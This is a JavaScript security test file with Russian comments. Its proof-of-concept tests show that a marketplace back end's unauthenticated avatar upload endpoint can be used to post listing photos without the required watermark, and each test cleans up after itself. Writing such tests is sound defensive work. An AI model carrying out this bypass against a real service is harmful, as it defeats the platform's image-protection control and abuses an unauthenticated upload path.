// ПРОВЕРКА: обязательный водяной знак UyTap на фото объявлений можно
// обойти, загрузив то же самое фото через ДРУГОЙ, публичный и
// НЕаутентифицированный эндпоинт (POST /api/upload — предназначен для
// аватаров/логотипов, без watermark), а затем подставить полученную ссылку
// в поле `photos` при создании объявления.
//
// Затрагиваемые файлы:
//   back-end/src/routes/uploadRoutes.js (POST "/" не требует authenticateToken)
//   back-end/src/controllers/uploadController.js (uploadImage не вызывает applyWatermark)
//   back-end/src/utils/validation.js (createListingSchema.photos = trustedImageUrl)
import { test } from "node:test";
import assert from "node:assert/strict";
import {
  api,
  BASE_URL,
  registerTestUser,
  deleteTestUser,
  deleteTestListing,
  baseListingPayload,
  supabaseAdmin,
  logDbOp,
  isTestDbConfigured,
  SKIP_NO_TEST_DB_REASON,
} from "./helpers.mjs";
import zlib from "node:zlib";

function makeSolidPng(width, height, rgb = [30, 144, 255]) {
  const [r, g, b] = rgb;
  const rowSize = 1 + width * 3;
  const raw = Buffer.alloc(rowSize * height);
  for (let y = 0; y < height; y++) {
    const rowStart = y * rowSize;
    raw[rowStart] = 0;
    for (let x = 0; x < width; x++) {
      const px = rowStart + 1 + x * 3;
      raw[px] = r;
      raw[px + 1] = g;
      raw[px + 2] = b;
    }
  }
  const compressed = zlib.deflateSync(raw);

  function chunk(type, data) {
    const len = Buffer.alloc(4);
    len.writeUInt32BE(data.length, 0);
    const typeBuf = Buffer.from(type, "ascii");
    const crcBuf = Buffer.alloc(4);
    const crc = crc32(Buffer.concat([typeBuf, data]));
    crcBuf.writeUInt32BE(crc >>> 0, 0);
    return Buffer.concat([len, typeBuf, data, crcBuf]);
  }

  let crcTable = null;
  function crc32(buf) {
    if (!crcTable) {
      crcTable = new Uint32Array(256);
      for (let n = 0; n < 256; n++) {
        let c = n;
        for (let k = 0; k < 8; k++) {
          c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
        }
        crcTable[n] = c;
      }
    }
    let crc = 0xffffffff;
    for (let i = 0; i < buf.length; i++) {
      crc = crcTable[(crc ^ buf[i]) & 0xff] ^ (crc >>> 8);
    }
    return (crc ^ 0xffffffff) >>> 0;
  }

  const sig = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(width, 0);
  ihdr.writeUInt32BE(height, 4);
  ihdr[8] = 8;
  ihdr[9] = 2;
  ihdr[10] = 0;
  ihdr[11] = 0;
  ihdr[12] = 0;

  return Buffer.concat([
    sig,
    chunk("IHDR", ihdr),
    chunk("IDAT", compressed),
    chunk("IEND", Buffer.alloc(0)),
  ]);
}

async function uploadMultipart(pathname, { token, fieldName, filename, buffer, contentType }) {
  const boundary = "----secTestBoundary" + Date.now();
  const head =
    `--${boundary}\r\n` +
    `Content-Disposition: form-data; name="${fieldName}"; filename="${filename}"\r\n` +
    `Content-Type: ${contentType}\r\n\r\n`;
  const tail = `\r\n--${boundary}--\r\n`;
  const body = Buffer.concat([Buffer.from(head, "utf-8"), buffer, Buffer.from(tail, "utf-8")]);

  const headers = { "Content-Type": `multipart/form-data; boundary=${boundary}` };
  if (token) headers["Authorization"] = `Bearer ${token}`;

  const res = await fetch(`${BASE_URL}${pathname}`, { method: "POST", headers, body });
  let json = null;
  try {
    json = await res.json();
  } catch {}
  return { status: res.status, body: json };
}

test(
  "Unauthenticated upload: POST /api/upload requires NO auth token at all",
  { skip: !isTestDbConfigured ? SKIP_NO_TEST_DB_REASON : false },
  async () => {
    const png = makeSolidPng(300, 300);
    const { status, body } = await uploadMultipart("/api/upload", {
      token: null,
      fieldName: "file",
      filename: "poc.png",
      buffer: png,
      contentType: "image/png",
    });

    assert.equal(status, 200, `expected 200 (unauthenticated upload succeeded), got ${status}: ${JSON.stringify(body)}`);
    assert.ok(body?.url, "expected a public URL back");

    const path = body.url.split("/object/public/avatars/")[1];
    if (path && supabaseAdmin) {
      await supabaseAdmin.storage.from("avatars").remove([path]);
      logDbOp(`DELETE storage avatars/${path} (cleanup, unauth upload PoC)`);
    }
  }
);

test(
  "Watermark bypass: image uploaded via unauth /api/upload (no watermark) can be used as a listing photo",
  { skip: !isTestDbConfigured ? SKIP_NO_TEST_DB_REASON : false },
  async () => {
    const { token, user } = await registerTestUser();
    let listingId = null;
    let uploadedPath = null;

    try {
      const png = makeSolidPng(600, 600, [200, 30, 30]);

      // 1) Легитимный watermark-пайплайн
      const watermarkedRes = await uploadMultipart("/api/upload/listing-photo", {
        token,
        fieldName: "file",
        filename: "photo.png",
        buffer: png,
        contentType: "image/png",
      });
      assert.equal(watermarkedRes.status, 200, JSON.stringify(watermarkedRes.body));
      const watermarkedUrl = watermarkedRes.body.url;
      const watermarkedBytes = Buffer.from(await (await fetch(watermarkedUrl)).arrayBuffer());

      // 2) Обход: та же картинка через публичный /api/upload
      const bypassRes = await uploadMultipart("/api/upload", {
        token: null,
        fieldName: "file",
        filename: "photo.png",
        buffer: png,
        contentType: "image/png",
      });
      assert.equal(bypassRes.status, 200, JSON.stringify(bypassRes.body));
      const bypassUrl = bypassRes.body.url;
      uploadedPath = bypassUrl.split("/object/public/avatars/")[1];
      const bypassBytes = Buffer.from(await (await fetch(bypassUrl)).arrayBuffer());

      assert.ok(
        bypassBytes.equals(png),
        "expected bypass-uploaded image bytes to be identical to the original (no watermark applied)"
      );
      assert.ok(
        !watermarkedBytes.equals(png),
        "sanity check: the dedicated watermark endpoint should have actually modified the image"
      );

      // 3) Подставляем ссылку как фото
      const listingRes = await api("/api/listings", {
        method: "POST",
        token,
        body: baseListingPayload({ photos: [bypassUrl] }),
      });
      assert.equal(listingRes.status, 201, JSON.stringify(listingRes.body));
      listingId = listingRes.body.data.id;

      const getRes = await api(`/api/listings/${listingId}`);
      assert.equal(getRes.status, 200);
      const savedPhotoUrl = getRes.body.data.listing_photos?.[0]?.url;
      assert.equal(
        savedPhotoUrl,
        bypassUrl,
        "listing should now be publicly showing an unwatermarked photo"
      );

      const finalBytes = Buffer.from(await (await fetch(savedPhotoUrl)).arrayBuffer());
      assert.ok(
        finalBytes.equals(png),
        "EXPLOIT CONFIRMED: publicly served listing photo has NO watermark, bypassing the mandatory watermark feature"
      );
    } finally {
      if (listingId) await deleteTestListing(listingId);
      if (uploadedPath && supabaseAdmin) {
        await supabaseAdmin.storage.from("avatars").remove([uploadedPath]);
        logDbOp(`DELETE storage avatars/${uploadedPath} (cleanup, watermark-bypass PoC)`);
      }
      await deleteTestUser(user.id);
    }
  }
);
